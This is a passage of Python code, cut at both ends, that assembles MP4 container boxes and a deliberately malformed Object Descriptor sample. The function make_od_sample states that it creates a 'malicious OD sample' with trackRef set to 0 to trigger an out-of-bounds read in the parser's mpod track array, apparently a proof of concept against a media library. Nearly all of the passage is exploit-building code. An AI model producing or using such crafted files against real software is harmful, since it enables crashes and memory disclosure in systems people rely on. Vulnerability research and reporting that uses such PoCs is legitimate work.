e, mdat_offset):\n    """Create minf box for OD track"""\n    # nmhd - null media header\n    nmhd_data = struct.pack(\'>I\', 0)  # version=0, flags=0\n    nmhd = write_box(b\'nmhd\', nmhd_data)\n    \n    data = nmhd\n    data += make_dinf()\n    data += make_stbl_od(sample_size, mdat_offset)\n    return write_box(b\'minf\', data)\n\ndef make_tref_mpod(track_ids):\n    """Create tref box with mpod reference"""\n    # mpod box contains track IDs\n    mpod_data = b\'\'\n    for tid in track_ids:\n        mpod_data += struct.pack(\'>I\', tid)\n    mpod_box = write_box(b\'mpod\', mpod_data)\n    \n    return write_box(b\'tref\', mpod_box)\n\ndef make_mdia_od(sample_size, mdat_offset):\n    """Create mdia box for OD track"""\n    data = make_mdhd()\n    data += make_hdlr(b\'odsm\', \'ObjectDescriptorHandler\')\n    data += make_minf_od(sample_size, mdat_offset)\n    return write_box(b\'mdia\', data)\n\ndef make_od_sample():\n    """\n    Create malicious OD sample with ES_ID_Ref containing invalid trackRef.\n    \n    The OD sample format:\n    - OD Update Command (tag=0x01)\n      - Contains ISOM_OD descriptor (tag=0x0F)\n        - objectDescriptorID\n        - URLLength (0 = no URL)\n        - ES_ID_Ref descriptor (tag=0x0E)\n          - trackRef (16-bit value, will be 0 to trigger OOB read)\n    """\n    \n    # ES_ID_Ref descriptor tag=0x0E (GF_ODF_ESD_REF_TAG)\n    # This is the malicious part - trackRef = 0 will cause OOB read at mpod->trackIDs[0-1]\n    es_id_ref_data = struct.pack(\'>H\', 0)  # trackRef = 0 (INVALID!)\n    es_id_ref_desc = struct.pack(\'>B\', 0x0E) + encode_desc_size(len(es_id_ref_data)) + es_id_ref_data\n    \n    # ISOM OD descriptor tag=0x0F (GF_ODF_ISOM_OD_TAG)\n    isom_od_data = b\'\'\n    isom_od_data += struct.pack(\'>H\', 1)  # objectDescriptorID\n    isom_od_data += struct.pack(\'>B\', 0)  # URLLength = 0 (no URL string)\n    isom_od_data += es_id_ref_desc  # Add the ES_ID_Ref\n    \n    isom_od_desc = struct.pack(\'>B\', 0x0F) + encod